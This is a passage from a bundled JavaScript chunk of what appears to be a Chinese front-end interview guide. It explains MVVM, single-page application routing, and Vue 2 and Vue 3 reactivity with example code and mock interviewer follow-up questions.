(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{1153:function(e){e.exports=JSON.parse('{"html":"<h2 id=\\"_1-谈谈你对mvvm的理解\\"><a class=\\"header-anchor\\" href=\\"#_1-谈谈你对mvvm的理解\\">#</a> 1 谈谈你对MVVM的理解</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>MVVM</code> = <code>Model</code>（数据）+ <code>View</code>（视图）+ <code>ViewModel</code>（连接两者的中间层）</li>\\n<li>核心是 <code>ViewModel</code> 通过数据绑定自动同步两个方向，开发者不再手动操作 <code>DOM</code></li>\\n<li>相比 <code>MVC</code>：<code>MVC</code> 的 <code>Controller</code> 要手写&quot;取数据 → 更新视图&quot;的胶水代码，<code>MVVM</code> 把这层自动化了</li>\\n<li><code>Vue</code> 的 <code>ViewModel</code> 由响应式系统 + 模板编译 + 虚拟 <code>DOM</code> 共同实现</li>\\n<li>实际价值不是&quot;少写代码&quot;，而是<strong>让状态成为唯一事实来源</strong>，视图永远是状态的函数</li>\\n</ul>\\n<p><strong><code>MVVM</code> 就是用 <code>ViewModel</code> 连接 <code>Model</code> 和 <code>View</code>，让数据变化能自动反映到界面。</strong> 相比 <code>MVC</code> 中手动编写控制器来取数据、更新视图，它把这部分同步工作交给数据绑定，开发者通常不需要直接操作 <code>DOM</code>。在 <code>Vue</code> 中，响应式系统负责感知状态变化，模板把状态映射成视图，事件再修改状态。它的价值是降低界面与业务的耦合，让数据成为视图更新的依据。</p>\\n</section>\\n<p>为什么要有这些模式，目的：职责划分、分层（将<code>Model</code>层、<code>View</code>层进行分类）借鉴后端思想，对于前端而已，就是如何将数据同步到页面上</p>\\n<p><strong>MVC模式</strong> 代表：<code>Backbone</code> + <code>underscore</code> + <code>jquery</code></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/bf9b97960412f53f.png\\" alt=\\"\\"></p>\\n<ul>\\n<li>传统的 <code>MVC</code> 指的是,用户操作会请求服务端路由，路由会调用对应的控制器来处理，控制器会获取数据。将结果返回给前端,页面重新渲染</li>\\n<li><code>MVVM</code>：传统的前端会将数据手动渲染到页面上, <code>MVVM</code> 模式不需要用户收到操作 <code>dom</code> 元素,将数据绑定到 <code>viewModel</code> 层上，会自动将数据渲染到页面中，视图变化会通知 <code>viewModel</code>层 更新数据。<code>ViewModel</code> 就是我们 <code>MVVM</code> 模式中的桥梁</li>\\n</ul>\\n<p><strong>MVVM模式</strong> 映射关系的简化，隐藏了<code>controller</code></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/41f439971593ef61.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p><code>MVVM</code>是<code>Model-View-ViewModel</code>缩写，也就是把<code>MVC</code>中的<code>Controller</code>演变成<code>ViewModel</code>。<code>Model</code>层代表数据模型，<code>View</code>代表UI组件，<code>ViewModel</code>是<code>View</code>和<code>Model</code>层的桥梁，数据会绑定到<code>viewModel</code>层并自动将数据渲染到页面中，视图变化的时候会通知<code>viewModel</code>层更新数据。</p>\\n</blockquote>\\n<ul>\\n<li><code>Model</code>: 代表数据模型，也可以在<code>Model</code>中定义数据修改和操作的业务逻辑。我们可以把<code>Model</code>称为数据层，因为它仅仅关注数据本身，不关心任何行为</li>\\n<li><code>View</code>: 用户操作界面。当<code>ViewModel</code>对<code>Model</code>进行更新的时候，会通过数据绑定更新到<code>View</code></li>\\n<li><code>ViewModel</code>： 业务逻辑层，<code>View</code>需要什么数据，<code>ViewModel</code>要提供这个数据；<code>View</code>有某些操作，<code>ViewModel</code>就要响应这些操作，所以可以说它是<code>Model for View</code>.</li>\\n</ul>\\n<p><strong>总结</strong>： <code>MVVM</code>模式简化了界面与业务的依赖，解决了数据频繁更新。<code>MVVM</code> 在使用当中，利用双向绑定技术，使得 <code>Model</code> 变化时，<code>ViewModel</code> 会自动更新，而 <code>ViewModel</code> 变化时，<code>View</code> 也会自动变化。</p>\\n<p>我们以下通过一个 <code>Vue</code> 实例来说明 <code>MVVM</code> 的具体实现</p>\\n<pre class=\\"language-html\\"><code>&lt;!-- View 层 --&gt;\\n\\n&lt;div id=&quot;app&quot;&gt;\\n  &lt;p&gt;{{message}}&lt;/p&gt;\\n  &lt;button v-on:click=&quot;showMessage()&quot;&gt;Click me&lt;/button&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<pre class=\\"language-js\\"><code>var app = new Vue({\\n  el: &#39;#app&#39;,\\n  data: {  // 用于描述视图状态  \\n    message: &#39;Hello Vue!&#39;, // Model 层\\n  },\\n  // ViewModel 层：通过事件修改model层数据\\n  methods: {  // 用于描述视图行为  \\n    showMessage(){\\n      let vm = this;\\n      alert(vm.message);\\n    }\\n  },\\n  created(){\\n    let vm = this;\\n    // Ajax 获取 Model 层的数据\\n    ajax({\\n      url: &#39;/your/server/data/api&#39;,\\n      success(res){\\n        vm.message = res;\\n      }\\n    });\\n  }\\n})\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>表单页用了 <code>Vue</code>，评审因此宣称“只要有双向绑定，模板、接口和业务逻辑混在组件里也符合 <code>MVVM</code>”，你怎么回应？</strong></p>\\n<p>双向绑定只是数据同步机制，<code>MVVM</code> 的价值还在于划分 <code>Model</code>、<code>View</code> 与 <code>ViewModel</code> 的职责。若接口处理、数据规则和界面细节全部耦合在一起，虽然页面能自动更新，却没有获得分层带来的可维护性。</p>\\n</li>\\n<li>\\n<p><strong>订单编辑页要求输入框修改后立即更新金额展示，你会把校验、计算和直接操作 <code>DOM</code> 分别放在哪里？</strong></p>\\n<p>输入控件属于 <code>View</code>，订单数据及其修改规则属于 <code>Model</code>，供界面使用的状态和交互响应由 <code>ViewModel</code> 协调。金额变化应通过数据绑定驱动视图，不应把查询并改写 <code>DOM</code> 作为主流程；复杂业务仍需避免全部堆进视图层。</p>\\n</li>\\n<li>\\n<p><strong>一个只读报表没有任何用户输入，架构师认为缺少“视图到数据”的更新，因此不能算 <code>MVVM</code>；你认同吗？</strong></p>\\n<p>不认同，双向更新是常见能力，不代表每个页面都必须产生两个方向的数据变化。只读场景仍可由 <code>ViewModel</code> 向 <code>View</code> 提供展示状态，并隔离数据模型与界面；若强行制造反向绑定，只会增加无意义的状态通道。</p>\\n</li>\\n<li>\\n<p><strong>用户点击按钮后接口已返回新文案，但页面仍显示旧值；同事准备直接用选择器改文本，你会怎样排查？</strong></p>\\n<p>先确认响应结果是否写入了绑定到模板的状态，再检查模板读取的是否是同一份数据，以及交互方法是否确实更新了 <code>ViewModel</code>。直接修改 <code>DOM</code> 会绕开数据绑定，使 <code>View</code> 与状态产生两个真相，只适合作为定位现象而非正式修复。</p>\\n</li>\\n<li>\\n<p><strong>团队在小型静态活动页上争论是否必须完整引入 <code>MVVM</code> 框架，你如何做取舍？</strong></p>\\n<p>若页面几乎没有状态变化，完整的数据绑定和分层机制带来的收益可能有限，简单渲染即可满足需求。状态频繁更新、交互增多时，<code>ViewModel</code> 作为桥梁能降低手工同步成本；模式应服务于职责划分，而不是成为固定门槛。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_2-谈谈你对spa单页面的理解\\"><a class=\\"header-anchor\\" href=\\"#_2-谈谈你对spa单页面的理解\\">#</a> 2 谈谈你对SPA单页面的理解</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>SPA</code> 只加载一个 <code>HTML</code>，后续路由切换靠 <code>JS</code> 替换视图，不再整页刷新</li>\\n<li>优点：切换无白屏、体验接近原生、前后端职责清晰（后端只提供接口）</li>\\n<li>缺点：<strong>首屏慢</strong>（要等 <code>JS</code> 下载解析执行）、<strong><code>SEO</code> 差</strong>（爬虫拿到的是空壳）、内存泄漏风险高（页面不卸载）</li>\\n<li>首屏优化：路由懒加载、<code>Tree Shaking</code>、骨架屏、关键资源 <code>preload</code>、必要时上 <code>SSR</code>/预渲染</li>\\n<li><code>SEO</code> 方案按成本排序：预渲染（内容静态）&lt; <code>SSR</code>（有个性化内容）&lt; 动态渲染（给爬虫单独渲染）</li>\\n</ul>\\n<p><strong><code>SPA</code> 是首次加载一个主页面，后续通过前端路由替换局部视图，不再进行整页刷新。</strong> 这样页面切换更连贯，前端负责交互、后端提供数据接口，但首次需要下载和执行较多 <code>JavaScript</code>，首屏速度和 <code>SEO</code> 往往更难处理。路由通常基于 <code>hash</code> 或 <code>History API</code>，其中历史模式还需要服务端配合处理地址回退。工程上可用路由懒加载、按需加载改善首屏，内容需要搜索引擎收录时再考虑预渲染或 <code>SSR</code>。</p>\\n</section>\\n<blockquote>\\n<p><code>SPA</code>（ single-page application ）仅在 <code>Web</code> 页面初始化时加载相应的 <code>HTML</code>、<code>JavaScript</code> 和 <code>CSS</code>。一旦页面加载完成，<code>SPA</code> 不会因为用户的操作而进行页面的重新加载或跳转；取而代之的是利用路由机制实现 <code>HTML</code> 内容的变换，<code>UI</code> 与用户的交互，避免页面的重新加载</p>\\n</blockquote>\\n<p><strong>优点：</strong></p>\\n<ul>\\n<li>用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；</li>\\n<li>基于上面一点，<code>SPA</code> 相对对服务器压力小；</li>\\n<li>前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理</li>\\n</ul>\\n<p><strong>缺点：</strong></p>\\n<ul>\\n<li>初次加载耗时多：为实现单页 <code>Web</code> 应用功能及显示效果，需要在加载页面的时候将 <code>JavaScript</code>、<code>CSS</code> 统一加载，部分页面按需加载；</li>\\n<li>前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；</li>\\n<li><code>SEO</code> 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 <code>SEO</code> 上其有着天然的弱势</li>\\n</ul>\\n<p><strong>单页应用与多页应用的区别</strong></p>\\n<table>\\n<thead>\\n<tr>\\n<th></th>\\n<th>单页面应用（SPA）</th>\\n<th>多页面应用（MPA）</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td>组成</td>\\n<td>一个主页面和多个页面片段</td>\\n<td>多个主页面</td>\\n</tr>\\n<tr>\\n<td>刷新方式</td>\\n<td>局部刷新</td>\\n<td>整页刷新</td>\\n</tr>\\n<tr>\\n<td><code>url</code>模式</td>\\n<td>哈希模式</td>\\n<td>历史模式</td>\\n</tr>\\n<tr>\\n<td><code>SEO</code>搜索引擎优化</td>\\n<td>难实现，可使用SSR方式改善</td>\\n<td>容易实现</td>\\n</tr>\\n<tr>\\n<td>数据传递</td>\\n<td>容易</td>\\n<td>通过<code>url</code>、<code>cookie</code>、<code>localStorage</code>等传递</td>\\n</tr>\\n<tr>\\n<td>页面切换</td>\\n<td>速度快，用户体验良好</td>\\n<td>切换加载资源，速度慢，用户体验差</td>\\n</tr>\\n<tr>\\n<td>维护成本</td>\\n<td>相对容易</td>\\n<td>相对复杂</td>\\n</tr>\\n</tbody>\\n</table>\\n<p><strong>实现一个SPA</strong></p>\\n<ul>\\n<li>监听地址栏中<code>hash</code>变化驱动界面变化</li>\\n<li>用<code>pushsate</code>记录浏览器的历史，驱动界面发送变化</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/e2b412462d9e1bbf.png\\" alt=\\"\\"></p>\\n<ol>\\n<li><strong>hash 模式</strong>：核心通过监听<code>url</code>中的<code>hash</code>来进行路由跳转</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>// 定义 Router  \\nclass Router {  \\n    constructor () {  \\n        this.routes = {}; // 存放路由path及callback  \\n        this.currentUrl = &#39;&#39;;  \\n          \\n        // 监听路由change调用相对应的路由回调  \\n        window.addEventListener(&#39;load&#39;, this.refresh, false);  \\n        window.addEventListener(&#39;hashchange&#39;, this.refresh, false);  \\n    }  \\n      \\n    route(path, callback){  \\n        this.routes[path] = callback;  \\n    }  \\n      \\n    push(path) {  \\n        this.routes[path] &amp;&amp; this.routes[path]()  \\n    }  \\n}  \\n  \\n// 使用 router  \\nwindow.miniRouter = new Router();  \\nminiRouter.route(&#39;/&#39;, () =&gt; console.log(&#39;page1&#39;))  \\nminiRouter.route(&#39;/page2&#39;, () =&gt; console.log(&#39;page2&#39;))  \\n  \\nminiRouter.push(&#39;/&#39;) // page1  \\nminiRouter.push(&#39;/page2&#39;) // page2  \\n</code></pre>\\n<ol start=\\"2\\">\\n<li><strong>history模式</strong>：<code>history</code> 模式核心借用 <code>HTML5 history api</code>，<code>api</code> 提供了丰富的 <code>router</code> 相关属性先了解一个几个相关的api</li>\\n</ol>\\n<ul>\\n<li><code>history.pushState</code> 浏览器历史纪录添加记录</li>\\n<li><code>history.replaceState</code>修改浏览器历史纪录中当前纪录</li>\\n<li><code>history.popState</code> 当 <code>history</code> 发生变化时触发</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// 定义 Router  \\nclass Router {  \\n    constructor () {  \\n        this.routes = {};  \\n        this.listerPopState()  \\n    }  \\n      \\n    init(path) {  \\n        history.replaceState({path: path}, null, path);  \\n        this.routes[path] &amp;&amp; this.routes[path]();  \\n    }  \\n      \\n    route(path, callback){  \\n        this.routes[path] = callback;  \\n    }  \\n      \\n    push(path) {  \\n        history.pushState({path: path}, null, path);  \\n        this.routes[path] &amp;&amp; this.routes[path]();  \\n    }  \\n      \\n    listerPopState () {  \\n        window.addEventListener(&#39;popstate&#39; , e =&gt; {  \\n            const path = e.state &amp;&amp; e.state.path;  \\n            this.routers[path] &amp;&amp; this.routers[path]()  \\n        })  \\n    }  \\n}  \\n  \\n// 使用 Router  \\n  \\nwindow.miniRouter = new Router();  \\nminiRouter.route(&#39;/&#39;, ()=&gt; console.log(&#39;page1&#39;))  \\nminiRouter.route(&#39;/page2&#39;, ()=&gt; console.log(&#39;page2&#39;))  \\n  \\n// 跳转  \\nminiRouter.push(&#39;/page2&#39;)  // page2  \\n</code></pre>\\n<p><strong>题外话：如何给SPA做SEO</strong></p>\\n<ol>\\n<li>SSR服务端渲染</li>\\n</ol>\\n<p>将组件或页面通过服务器生成<code>html</code>，再返回给浏览器，如<code>nuxt.js</code></p>\\n<ol start=\\"2\\">\\n<li>静态化</li>\\n</ol>\\n<p>目前主流的静态化主要有两种：</p>\\n<ul>\\n<li>一种是通过程序将动态页面抓取并保存为静态页面，这样的页面的实际存在于服务器的硬盘中</li>\\n<li>另外一种是通过WEB服务器的 <code>URL Rewrite</code>的方式，它的原理是通过web服务器内部模块按一定规则将外部的URL请求转化为内部的文件地址，一句话来说就是把外部请求的静态地址转化为实际的动态页面地址，而静态页面实际是不存在的。这两种方法都达到了实现URL静态化的效果</li>\\n</ul>\\n<ol start=\\"3\\">\\n<li>使用<code>Phantomjs</code>针对爬虫处理</li>\\n</ol>\\n<p>原理是通过<code>Nginx</code>配置，判断访问来源是否为爬虫，如果是则搜索引擎的爬虫请求会转发到一个<code>node server</code>，再通过<code>PhantomJS</code>来解析完整的<code>HTML</code>，返回给爬虫。下面是大致流程图</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/d0b4e716fda54d7f.png\\" alt=\\"\\"></p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>内容平台虽然只加载一个 <code>HTML</code>，但每次点击菜单都整页刷新；产品仍称它是 <code>SPA</code>，你怎么判断？</strong></p>\\n<p>仅有一个入口文件不足以构成 <code>SPA</code>，关键是初始化后通过前端路由和脚本变换页面内容，而不是每次导航都重新加载整页。若菜单点击持续产生文档级跳转，它在交互方式上仍更接近多页面应用。</p>\\n</li>\\n<li>\\n<p><strong>一个包含数十个业务页面的管理后台首屏脚本过大，研发提议初始化时一次性加载所有页面资源；你会怎样调整？</strong></p>\\n<p><code>SPA</code> 首次加载本就可能承担较多 <code>JavaScript</code> 和 <code>CSS</code>，不应把所有页面资源都强制放入初始化路径。应保留应用入口与首屏所需内容，其余页面按需加载；代价是首次进入懒加载页面时仍会产生额外等待。</p>\\n</li>\\n<li>\\n<p><strong>离线部署的内部工具不能修改服务器配置，但仍要求浏览器前进后退可用；你会选哪种路由方案？</strong></p>\\n<p>更适合使用 <code>hash</code> 路由，通过监听 <code>hashchange</code> 驱动界面变化，并由浏览器历史处理前进后退，不需要服务器识别子路径。若改用 <code>history</code>，刷新子路由通常需要服务端回退支持，与当前部署约束冲突。</p>\\n</li>\\n<li>\\n<p><strong>自研 <code>history</code> 路由调用 <code>pushState</code> 后能切页，但用户点后退时偶尔白屏；你会检查哪段代码？</strong></p>\\n<p>应检查是否注册了 <code>popstate</code> 监听、是否从事件状态或当前路径恢复路由，以及路径未匹配时有没有明确处理。<code>pushState</code> 负责添加历史记录却不会替代后退监听；状态保存不完整时，恢复页面就可能找不到对应视图。</p>\\n</li>\\n<li>\\n<p><strong>官网需要搜索引擎直接获取正文，业务后台则强调切换速度；架构组坚持全站只能选 <code>SPA</code> 或 <code>MPA</code>，你怎么取舍？</strong></p>\\n<p>两类页面目标不同，不必强行使用同一种渲染形态：后台适合利用 <code>SPA</code> 的局部更新和数据传递优势，公开内容页应优先保证可索引内容。若公开页仍采用 <code>SPA</code>，可引入 <code>SSR</code> 或静态化改善，但会增加生成、部署或服务端维护成本。</p>\\n</li>\\n<li>\\n<p><strong>团队说 <code>SPA</code> 天然减轻服务器压力，所以把所有数据处理也搬到浏览器；这个推论成立吗？</strong></p>\\n<p>不成立，<code>SPA</code> 减少的是整页重复加载，并通过前后端分工让浏览器承担交互和局部渲染。后端仍应负责数据处理与接口输出，不能把“页面不刷新”等同于“服务器不再承担业务职责”；边界混乱反而会破坏架构清晰度。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_3-vue2-x-响应式数据原理\\"><a class=\\"header-anchor\\" href=\\"#_3-vue2-x-响应式数据原理\\">#</a> 3 Vue2.x 响应式数据原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>核心是 <code>Object.defineProperty</code> 递归劫持每个属性的 <code>getter</code>/<code>setter</code></li>\\n<li><code>getter</code> 里做<strong>依赖收集</strong>（把当前渲染 <code>Watcher</code> 存进这个属性的 <code>Dep</code>），<code>setter</code> 里 <code>dep.notify()</code> 通知更新</li>\\n<li>三个绕不开的限制：<strong>新增/删除属性拦不到</strong>（要 <code>Vue.set</code>/<code>Vue.delete</code>）、<strong>数组下标和 <code>length</code> 拦不到</strong>（重写了七个方法）</li>\\n<li>初始化时要<strong>递归遍历整个对象</strong>，大数据量下有明显开销</li>\\n<li>这些限制正是 <code>Vue 3</code> 换 <code>Proxy</code> 的直接原因</li>\\n</ul>\\n<p><strong><code>Vue 2</code> 的响应式本质上是用 <code>Object.defineProperty</code> 劫持已有属性，再通过依赖收集和派发更新驱动视图。</strong> 属性读取时会把当前 <code>Watcher</code> 收集到对应的 <code>Dep</code>，赋值时再调用通知逻辑触发更新。它无法直接发现对象属性的新增、删除，也监听不到数组下标赋值和 <code>length</code> 变化，因此要用 <code>Vue.set</code>、<code>Vue.delete</code>，数组则重写七个变更方法。初始化还要递归遍历数据，嵌套很深或数据量很大时会带来额外开销，这也是 <code>Vue 3</code> 改用 <code>Proxy</code> 的原因。</p>\\n</section>\\n<blockquote>\\n<p><strong>版本说明（面试主线看这里）</strong>：本节讲的 <code>Object.defineProperty</code> 是 <strong>Vue 2 的实现</strong>。<strong>Vue 3 的响应式主线已改用 <code>Proxy</code></strong>（见下一节「Vue3.x 响应式数据原理」），面试若不特别限定版本，应以 Vue 3 的 <code>Proxy</code> 方案为主线回答，再把本节的 <code>defineProperty</code> 作为「Vue 2 是怎么做的、有哪些缺陷」的历史对照。<code>defineProperty</code> 的两大缺陷——<strong>无法检测对象属性的新增/删除</strong>（需 <code>Vue.set</code>/<code>Vue.delete</code>）、<strong>无法检测数组下标赋值和 <code>length</code> 变化</strong>（靠重写 7 个数组方法）——正是 Vue 3 改用 <code>Proxy</code> 的直接动机。</p>\\n</blockquote>\\n<div class=\\"tip\\">\\n<p>对象内部通过 <code>defineReactive</code> 方法，使用 <code>Object.defineProperty</code> 来劫持各个属性的 <code>setter</code>、<code>getter</code>（只会劫持已经存在的属性），数组则是通过<code>重写数组7个方法</code>来实现。当页面使用对应属性时，每个属性都拥有自己的 <code>dep</code> 属性，存放他所依赖的 <code>watcher</code>（依赖收集），当属性变化后会通知自己对应的 <code>watcher</code> 去更新(派发更新)</p>\\n</div>\\n<p><strong>Object.defineProperty基本使用</strong></p>\\n<pre class=\\"language-js\\"><code>function observer(value) { // proxy reflect\\n    if (typeof value === &#39;object&#39; &amp;&amp; typeof value !== null)\\n    for (let key in value) {\\n        defineReactive(value, key, value[key]);\\n    }\\n}\\n\\nfunction defineReactive(obj, key, value) {\\n    observer(value);\\n    Object.defineProperty(obj, key, {\\n        get() { // 收集对应的key 在哪个方法（组件）中被使用\\n            return value;\\n        },\\n        set(newValue) {\\n            if (newValue !== value) {\\n                observer(newValue);\\n                value = newValue; // 让key对应的方法（组件重新渲染）重新执行\\n            }\\n        }\\n    })\\n}\\nlet obj1 = { school: { name: &#39;poetry&#39;, age: 20 } };\\nobserver(obj1);\\nconsole.log(obj1)\\n</code></pre>\\n<p><strong>源码分析</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/c2f6869e2adcf668.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>class Observer {\\n  // 观测值\\n  constructor(value) {\\n    this.walk(value);\\n  }\\n  walk(data) {\\n    // 对象上的所有属性依次进行观测\\n    let keys = Object.keys(data);\\n    for (let i = 0; i &lt; keys.length; i++) {\\n      let key = keys[i];\\n      let value = data[key];\\n      defineReactive(data, key, value);\\n    }\\n  }\\n}\\n// Object.defineProperty数据劫持核心 兼容性在ie9以及以上\\nfunction defineReactive(data, key, value) {\\n  observe(value); // 递归关键\\n  // --如果value还是一个对象会继续走一遍odefineReactive 层层遍历一直到value不是对象才停止\\n  //   思考？如果Vue数据嵌套层级过深 &gt;&gt;性能会受影响\\n  Object.defineProperty(data, key, {\\n    get() {\\n      console.log(&quot;获取值&quot;);\\n\\n      //需要做依赖收集过程 这里代码没写出来\\n      return value;\\n    },\\n    set(newValue) {\\n      if (newValue === value) return;\\n      console.log(&quot;设置值&quot;);\\n      //需要做派发更新过程 这里代码没写出来\\n      value = newValue;\\n    },\\n  });\\n}\\nexport function observe(value) {\\n  // 如果传过来的是对象或者数组 进行属性劫持\\n  if (\\n    Object.prototype.toString.call(value) === &quot;[object Object]&quot; ||\\n    Array.isArray(value)\\n  ) {\\n    return new Observer(value);\\n  }\\n}\\n</code></pre>\\n<div class=\\"tip\\">\\n<ul>\\n<li>所谓数据响应式就是<strong>能够使数据变化可以被检测并对这种变化做出响应的机制</strong></li>\\n<li><code>MVVM</code>框架中要解决的一个核心问题是连接数据层和视图层，通过<strong>数据驱动</strong>应用，数据变化，视图更新，要做到这点的就需要对数据做响应式处理，这样一旦数据发生变化就可以立即做出更新处理</li>\\n<li>以<code>vue</code>为例说明，通过数据响应式加上虚拟<code>DOM</code>和<code>patch</code>算法，开发人员只需要操作数据，关心业务，完全不用接触繁琐的DOM操作，从而大大提升开发效率，降低开发难度</li>\\n<li><code>vue2</code>中的数据响应式会根据数据类型来做不同处理，如果是<strong>对象则采用<code>Object.defineProperty()</code>的方式定义数据拦截，当数据被访问或发生变化时，我们感知并作出响应；如果是数组则通过覆盖数组对象原型的7个变更方法</strong>，使这些方法可以额外的做更新通知，从而作出响应。这种机制很好的解决了数据响应化的问题，但在实际使用中也存在一些缺点：比如初始化时的递归遍历会造成性能损失；新增或删除属性时需要用户使用<code>Vue.set/delete</code>这样特殊的<code>api</code>才能生效；对于<code>es6</code>中新产生的<code>Map</code>、<code>Set</code>这些数据结构不支持等问题</li>\\n<li>为了解决这些问题，<code>vue3</code>重新编写了这一部分的实现：利用<code>ES6</code>的<code>Proxy</code>代理要响应化的数据，它有很多好处，编程体验是一致的，不需要使用特殊<code>api</code>，初始化性能和内存消耗都得到了大幅改善；另外由于响应化的实现代码抽取为独立的<code>reactivity</code>包，使得我们可以更灵活的使用它，第三方的扩展开发起来更加灵活了</li>\\n</ul>\\n</div>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>用户资料页执行 <code>this.profile.nickname = \'Alice\'</code> 后接口参数变了，页面却没更新；同事说对象明明已经是响应式的，内部新增字段也应该自动生效，你怎么判断？</strong></p>\\n<p>在 <code>Vue 2</code> 中，新增的 <code>nickname</code> 没有经过初始化时的 <code>Object.defineProperty</code> 劫持，因此赋值不会触发依赖通知。应改用 <code>this.$set(this.profile, \'nickname\', \'Alice\')</code>；删除字段则用 <code>this.$delete</code>，直接增删都超出了既有属性的拦截范围。</p>\\n</li>\\n<li>\\n<p><strong>一个编辑器把服务端返回的深层配置完整放进 <code>data</code>，对象包含大量节点，首屏初始化出现长任务；你会怎样缩小响应式成本？</strong></p>\\n<p>先区分哪些字段真的驱动视图，因为 <code>Vue 2</code> 会递归遍历嵌套对象并为已有属性安装访问器。纯展示且不会变化的数据可用 <code>Object.freeze()</code> 跳过观测，或放在组件外、实例的非响应式位置；代价是后续修改它不会自动更新页面。</p>\\n</li>\\n<li>\\n<p><strong>团队把旧后台从 <code>Vue 2</code> 升到 <code>Vue 3</code>，代码里仍到处使用 <code>Vue.set</code>，评审时有人坚持这是保证新增属性响应式的必要规范，你会怎么处理？</strong></p>\\n<p>在 <code>Vue 3</code> 的 <code>Proxy</code> 响应式对象上，新增和删除属性可直接被拦截，不再需要 <code>Vue.set</code> 或 <code>Vue.delete</code>。迁移时应先确认对象确实来自 <code>reactive</code> 等响应式入口，再移除历史兼容写法；普通对象即使使用直接赋值也不会凭空获得响应性。</p>\\n</li>\\n<li>\\n<p><strong>订单页修改 <code>order.customer.name</code> 后偶发不刷新，但修改 <code>order.status</code> 正常；面对嵌套对象替换和新增字段混杂的代码，你会按什么路径排查？</strong></p>\\n<p>先确认 <code>name</code> 是初始化时已有属性，还是后来直接追加的；前者应有自己的 <code>getter</code>、<code>setter</code>，后者需要 <code>$set</code>。再检查 <code>customer</code> 是否被整体替换，正常的既有属性赋值会先观测新对象；若数据被放在冻结对象或非响应式位置，递归观测不会生效。</p>\\n</li>\\n<li>\\n<p><strong>大表单需要新增一个校验状态，同事建议 <code>this.form = {...this.form, invalid: true}</code>，另一位要求 <code>this.$set</code>；你如何做选型？</strong></p>\\n<p>只为补一个字段时优先 <code>this.$set(this.form, \'invalid\', true)</code>，它会为新属性建立响应式访问器并通知相关依赖。整体替换也能触发 <code>form</code> 属性的 <code>setter</code>，但新对象还要重新递归观测，并可能让依赖 <code>form</code> 的渲染或计算重新执行；若业务语义本就是不可变快照，整体替换才更自然。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_4-vue3-x-响应式数据原理\\"><a class=\\"header-anchor\\" href=\\"#_4-vue3-x-响应式数据原理\\">#</a> 4 Vue3.x 响应式数据原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>换成 <code>Proxy</code> + <code>Reflect</code>：拦的是<strong>整个对象的操作</strong>，新增属性、<code>delete</code>、数组下标赋值全都能拦到</li>\\n<li><strong>惰性代理</strong>：访问到哪一层才代理哪一层，不像 <code>Vue 2</code> 初始化就递归遍历整个对象</li>\\n<li>依赖存储用 <code>WeakMap&lt;target, Map&lt;key, Set&lt;effect&gt;&gt;&gt;</code>，对象被回收时依赖表自动消失，无需手动清理</li>\\n<li><code>ref</code> 处理原始值（用 <code>.value</code> 包一层）、<code>reactive</code> 处理对象；解构 <code>reactive</code> 会丢响应性，要用 <code>toRefs</code></li>\\n<li>代价：<code>Proxy</code> <strong>无法 polyfill</strong>，所以 <code>Vue 3</code> 直接不支持 <code>IE</code></li>\\n</ul>\\n<p><strong><code>Vue 3</code> 的响应式核心是用 <code>Proxy</code> 代理整个对象，并通过 <code>Reflect</code> 完成属性读写。</strong> 相比 <code>Object.defineProperty</code>，它能直接拦截对象新增、删除以及数组变化，不必逐个改造属性。嵌套对象采用惰性代理，只有读取到对象值时才继续调用 <code>reactive</code>，避免初始化阶段全量深度遍历。代价是 <code>Proxy</code> 无法用 <code>polyfill</code> 完整兼容旧浏览器。</p>\\n</section>\\n<blockquote>\\n<p><code>Vue3.x</code>改用<code>Proxy</code>替代<code>Object.defineProperty</code>。因为<code>Proxy</code>可以直接监听对象和数组的变化，并且有多达<code>13</code>种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。</p>\\n</blockquote>\\n<h3 id=\\"proxy基本用法\\"><a class=\\"header-anchor\\" href=\\"#proxy基本用法\\">#</a> proxy基本用法</h3>\\n<pre class=\\"language-js\\"><code>// proxy默认只会代理第一层对象，只有取值再次是对象的时候再次代理，不是一上来就代理，提高性能。不像vue2.x递归遍历每个对象属性\\nlet handler = {\\n    set(target, key, value) {\\n        return Reflect.set(target, key, value);\\n    },\\n    get(target, key) {\\n        if (typeof target[key] == &#39;object&#39; &amp;&amp; target[key] !== null) {\\n            return new Proxy(target[key], handler); // 懒代理，只有取值再次是对象的时候再次代理，提高性能\\n        }\\n        return Reflect.get(target, key);\\n    }\\n}\\nlet obj = { school: { name: &#39;poetry&#39;, age: 20 } };\\nlet proxy = new Proxy(obj, handler);\\n\\n// 返回对象的代理\\nproxy.school\\n</code></pre>\\n<h3 